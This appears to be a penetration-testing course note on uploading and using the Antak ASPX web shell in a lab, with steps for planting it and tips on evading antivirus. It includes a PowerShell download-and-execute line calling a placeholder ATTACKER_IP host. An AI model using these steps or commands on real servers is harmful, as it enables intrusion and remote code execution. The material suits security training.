# 13 — Antak Webshell

## Overview

**Antak** is an ASPX web shell built in ASP.NET, included in the **Nishang** offensive PowerShell toolset. It provides a PowerShell-like interface in the browser, making it ideal for Windows server exploitation.

---

## Learning Resource: IPPSEC

Before diving in, a great supplemental learning resource:

| Resource | Description |
|----------|-------------|
| **ippsec.rocks** | Search engine for IPPSEC's YouTube videos |
| **How it works** | Type a concept (e.g., "aspx") → get timestamped video links |
| **Use case** | Visual demonstrations of techniques covered in HTB Academy |

> Search for "aspx" on ippsec.rocks to see web shell demonstrations on retired HTB boxes.

---

## ASPX Explained

**Active Server Page Extended (ASPX)** is a file type for Microsoft's ASP.NET Framework.

| Aspect | Description |
|--------|-------------|
| **Framework** | ASP.NET (Microsoft) |
| **Function** | Web form pages that process user input server-side |
| **Output** | Converts server-side code to HTML |
| **Exploitation** | Upload ASPX web shell → control underlying Windows OS |

---

## What is Antak?

| Feature | Description |
|---------|-------------|
| **Project** | Part of Nishang (Offensive PowerShell toolset) |
| **Interface** | PowerShell-themed web UI |
| **Execution** | Each command runs as a new process |
| **Capabilities** | Execute scripts in memory, encode commands, upload/download files |
| **Target** | Windows servers running ASP.NET |

---

## Antak Location

```bash
ls /usr/share/nishang/Antak-WebShell
```

```
antak.aspx  Readme.md
```

---

## Working with Antak

### Step 1: Copy for Modification

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

### Step 2: Set Credentials

Edit **line 14** to add authentication:

```csharp
if (User == "htb-student" && Pass == "htb-student")
```

| Change | Purpose |
|--------|---------|
| **Set username** | Prevents unauthorized access to your shell |
| **Set password** | Adds authentication layer |
| **Remove ASCII art** | Evade AV signatures |
| **Remove comments** | Reduce detection risk |

### Step 3: Upload the Shell

Use the target application's upload function to upload `Upload.aspx`.

### Step 4: Navigate to the Shell

```
http://status.inlanefreight.local/files/Upload.aspx
```

### Step 5: Authenticate

Enter your configured username and password at the login prompt.

---

## Antak Interface Features

Once authenticated, you get a PowerShell-like interface:

| Feature | Function |
|---------|----------|
| **Command prompt** | Execute PowerShell commands |
| **Submit** | Run the entered command |
| **Browse / Upload the File** | Upload files to the target |
| **Download** | Download files from the target |
| **Encode and Execute** | Run encoded scripts (AV evasion) |
| **Parse web.config** | Extract configuration/credentials |
| **Execute SQL Query** | Run database queries (requires connection string) |

### Built-in Help

Type `help` in the prompt window to see available commands.

---

## Antak vs Laudanum

| Aspect | Antak | Laudanum ASPX |
|--------|-------|---------------|
| **Interface** | PowerShell-themed, feature-rich | Simple command input |
| **Authentication** | Built-in user/pass | IP whitelist |
| **Features** | Upload, download, SQL, encoding | Basic command execution |
| **Framework** | ASP.NET / PowerShell | ASP.NET |
| **Best for** | Full-featured Windows exploitation | Quick & simple RCE |

---

## Example Commands in Antak

```powershell
# List current directory
dir

# Show current path
pwd

# List users
dir C:\Users

# System information
systeminfo

# Network configuration
ipconfig /all

# Running processes
Get-Process

# Download file to target
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')
```

---

## Operational Security Tips

| Tip | Reason |
|-----|--------|
| **Set credentials** | Prevent others from using your shell |
| **Remove ASCII art** | Signatured by AV |
| **Remove comments** | Reduce detection |
| **Rename the file** | `Upload.aspx` is less suspicious than `antak.aspx` |
| **Use encoding** | "Encode and Execute" helps evade detection |
| **Clean up after** | Delete the shell when finished |

---

## Key Takeaways

| Concept | Remember |
|---------|----------|
| **Antak location** | `/usr/share/nishang/Antak-WebShell/antak.aspx` |
| **Part of Nishang** | Offensive PowerShell toolset |
| **PowerShell interface** | Feature-rich compared to basic web shells |
| **Set credentials** | Edit line 14 before uploading |
| **Windows only** | Requires ASP.NET / IIS server |
| **ippsec.rocks** | Great resource for visual learning |
